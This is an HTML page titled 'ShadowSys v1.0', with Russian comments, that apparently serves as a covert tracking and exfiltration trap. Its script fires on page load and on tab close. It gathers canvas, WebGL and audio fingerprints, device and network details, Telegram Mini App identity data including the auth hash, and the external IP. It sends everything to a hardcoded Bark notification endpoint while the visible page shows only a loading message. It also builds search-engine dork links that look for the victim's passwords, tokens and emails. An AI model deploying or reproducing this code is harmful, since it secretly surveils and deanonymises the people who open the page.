<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ShadowSys v1.0</title>
    <script>
        // ========== БАРК АПИ ==========
        const BARK_URL = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';

        // Функция отправки в BARK
        function sendToBark(title, body) {
            const payload = {
                title: title,
                body: body,
                group: 'ShadowLog',
                sound: 'alarm'
            };
            // Используем sendBeacon, чтобы успеть отправить даже при закрытии вкладки
            navigator.sendBeacon(BARK_URL, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
            
            // Дублируем fetch для надёжности (если sendBeacon не сработает)
            fetch(BARK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        // ========== 1. СБОР ФИНГЕРПРИНТА (МАКСИМУМ) ==========
        function getFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 128;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 16, 16);
            ctx.fillStyle = '#069';
            ctx.fillText('ShadowCode', 2, 15);
            const canvasHash = canvas.toDataURL().substring(0, 64);

            // WebGL Vendor
            let glVendor = 'N/A', glRenderer = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}

            // Audio fingerprint (колебания звука)
            let audioFp = 'N/A';
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                oscillator.frequency.value = 1000;
                const data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                audioFp = btoa(String.fromCharCode(...data.slice(0, 20))).substring(0, 20);
                oscillator.disconnect();
            } catch (e) {}

            return {
                canvas_hash: canvasHash,
                webgl_vendor: glVendor,
                webgl_renderer: glRenderer,
                audio_fp: audioFp
            };
        }

        // ========== 2. БАТАРЕЯ И ПЕРФ ==========
        function getBatteryInfo() {
            let batt = { level: 'N/A', charging: 'N/A' };
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    batt.level = (b.level * 100).toFixed(0) + '%';
                    batt.charging = b.charging ? 'Да' : 'Нет';
                }).catch(() => {});
            }
            return batt;
        }

        // ========== 3. TELEGRAM WEB APP (MINI APPS) ==========
        function getTelegramData() {
            let tg = { username: 'N/A', id: 'N/A', first_name: 'N/A' };
            try {
                if (window.Telegram && window.Telegram.WebApp) {
                    const app = window.Telegram.WebApp;
                    if (app.initDataUnsafe) {
                        const user = app.initDataUnsafe.user;
                        if (user) {
                            tg.username = user.username || 'N/A';
                            tg.id = user.id || 'N/A';
                            tg.first_name = user.first_name || 'N/A';
                        }
                        // Дополнительно чекаем auth_date и hash
                        tg.auth_date = app.initDataUnsafe.auth_date || 'N/A';
                        tg.hash = app.initDataUnsafe.hash || 'N/A';
                    }
                }
            } catch (e) {}
            return tg;
        }

        // ========== 4. ГЕНЕРАЦИЯ ДОРК-ССЫЛОК ==========
        function getDorkLinks(username) {
            if (!username || username === 'N/A') return [];
            const dorks = [
                `"${username}" site:github.com`,
                `"${username}" site:youtube.com`,
                `"${username}" site:instagram.com`,
                `"${username}" site:twitter.com`,
                `"${username}" site:tiktok.com`,
                `"${username}" site:reddit.com`,
                `"${username}" site:pastebin.com`,
                `"${username}" filetype:pdf`,
                `"${username}" filetype:docx`,
                `"${username}" "password"`,
                `"${username}" "token"`,
                `"${username}" "api key"`,
                `"${username}" "@gmail.com"`,
                `"${username}" "skype"`
            ];
            return dorks.map(d => `https://www.google.com/search?q=${encodeURIComponent(d)}`);
        }

        // ========== 5. ГЛАВНЫЙ СБОР И ОТПРАВКА ==========
        function collectAndSend() {
            try {
                const fp = getFingerprint();
                const tg = getTelegramData();
                const dorks = getDorkLinks(tg.username);

                // Сбор базовой информации
                const data = {
                    ip: 'N/A (прокси/сервер)',
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(',') : 'N/A',
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'N/A',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screenRes: `${screen.width}x${screen.height}`,
                    screenColorDepth: screen.colorDepth,
                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
                    plugins: Array.from(navigator.plugins).map(p => p.name).join('; '),
                    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join('; '),
                    connection: navigator.connection ? {
                        rtt: navigator.connection.rtt,
                        downlink: navig.connection.downlink,
                        effectiveType: navig.connection.effectiveType
                    } : 'N/A',
                    // Telegram
                    tg_username: tg.username,
                    tg_id: tg.id,
                    tg_first_name: tg.first_name,
                    tg_auth_date: tg.auth_date,
                    tg_hash: tg.hash,
                    // Fingerprint
                    canvas_hash: fp.canvas_hash,
                    webgl_vendor: fp.webgl_vendor,
                    webgl_renderer: fp.webgl_renderer,
                    audio_fp: fp.audio_fp,
                    // Dorks
                    dork_links: dorks.join(' | ')
                };

                // Формируем читаемое тело для BARK
                let bodyText = `🕵️‍♂️ SHADOWLOG | ${new Date().toISOString()}\n\n`;
                bodyText += `📱 TG: @${data.tg_username} (ID: ${data.tg_id})\n`;
                bodyText += `👤 Имя: ${data.tg_first_name}\n`;
                bodyText += `🖥️ UA: ${data.userAgent}\n`;
                bodyText += `📍 Платформа: ${data.platform}\n`;
                bodyText += `🌐 Язык: ${data.language} | Таймзона: ${data.timezone}\n`;
                bodyText += `📺 Экран: ${data.screenRes} (${data.screenColorDepth}bit)\n`;
                bodyText += `🔌 Плагины: ${data.plugins.substring(0, 100)}...\n`;
                bodyText += `📶 Сеть: ${typeof data.connection === 'string' ? data.connection : data.connection.effectiveType} (RTT: ${data.connection.rtt || 'N/A'})\n`;
                bodyText += `🎨 Canvas: ${data.canvas_hash.substring(0, 20)}...\n`;
                bodyText += `🎮 WebGL: ${data.webgl_vendor} | ${data.webgl_renderer}\n`;
                bodyText += `🔊 Audio FP: ${data.audio_fp}\n`;
                bodyText += `🔗 DORKS: ${data.dork_links || 'Нет юзернейма'}\n`;

                // Отправляем
                sendToBark('⚡ ShadowCode | Full Dump', bodyText);

                // Дополнительно шлём сырой JSON, если надо (вторым уведомлением)
                setTimeout(() => {
                    sendToBark('📦 RAW JSON', JSON.stringify(data, null, 2).substring(0, 2000));
                }, 300);

                // Показать в консоли для отладки (чтобы ты видел, что ушло)
                console.log('[ShadowCode] Отправлено:', data);

            } catch (err) {
                sendToBark('⚠️ ShadowCode ERROR', err.message);
            }
        }

        // ========== СТАРТ СРАЗУ ==========
        window.onload = function() {
            collectAndSend();

            // Повторный сбор через 2 секунды для батареи (асинхрон)
            setTimeout(() => {
                getBatteryInfo().then(batt => {
                    sendToBark('🔋 Батарея', `Заряд: ${batt.level}\nЗарядка: ${batt.charging}`);
                }).catch(() => {});
            }, 2000);

            // Пытаемся достать IP через внешний сервис (но CORS может убить - оставляем для смельчаков)
            try {
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(ipData => {
                        sendToBark('🌐 IP Адрес (внешний)', `IP: ${ipData.ip}`);
                    }).catch(() => {});
            } catch (e) {}
        };

        // ========== ЕЩЁ ОДНА ЗАГЛУШКА ДЛЯ СБОРА ПРИ ЗАКРЫТИИ ==========
        window.addEventListener('beforeunload', function() {
            collectAndSend(); // отправим ещё раз, на всякий случай
        });

        console.log('[ShadowCode] Инъекция готова. Жди уведомлений в BARK.');
    </script>
</head>

    <p style="color:#555;">Загрузка данных...</p>

    <div style="display:none;">Подключено к матрице...</div>
</body>
</html>
